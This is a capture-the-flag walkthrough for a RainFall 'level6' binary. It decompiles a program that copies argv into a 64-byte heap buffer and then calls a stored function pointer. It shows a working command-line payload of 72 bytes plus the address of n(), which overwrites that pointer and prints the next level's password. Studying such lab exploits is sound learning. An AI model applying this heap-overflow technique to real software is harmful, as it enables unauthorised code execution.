# level6

### First analysis

On this level we get some more content on the main function and 2 other functions, this is a version of it we got on ghidra:

```c
void n(void) {
  system("/bin/cat /home/user/level7/.pass");
  return;
}

void m(void *param_1,int param_2,char *param_3,int param_4,int param_5) {
  puts("Nope");
  return;
}

void main(undefined4 param_1,int param_2) {
  char *__dest;
  code **ppcVar1;
  
  __dest = (char *)malloc(0x40);
  ppcVar1 = (code **)malloc(4);
  *ppcVar1 = m;
  strcpy(__dest,*(char **)(param_2 + 4));
  (**ppcVar1)();
  return;
}
```

A more understanable version is made on source.c as always. But to break it down shortly, we get some allocations with malloc and the address of m() function is stored in this weird ppcVar1. Then av[1] is copied in dest that is also allocated on the heap with a 64 buffer limits. then the value stored in ppcVar1 is called so m is called.

### Finding the solution

The first thing we tried is seaching the size of the buffer and until where we can overflow it without getting a segfault. We detected that that 72 chars is the limit, at 73 it just crashes and interesting thing when doing so, a payload with 72 characters and 4 'A' and this is what we get:

```sh
(gdb) run $(python -c 'print "B" * 72 + "AAAA"')
Starting program: /home/user/level6/level6 $(python -c 'print "B" * 72 + "AAAA"')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

The address of crash is replaced by 41414141 which is the hex value of 4 'A'. Like on our firsts levels. So we did the same as the firsts levels. We get the address of n() which is 0x08048454. We then simply type a buffer of 72 chars and the address of n():

```sh
level6@RainFall:~$ ./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
And there it is, we got the flag. Insanely easy level.
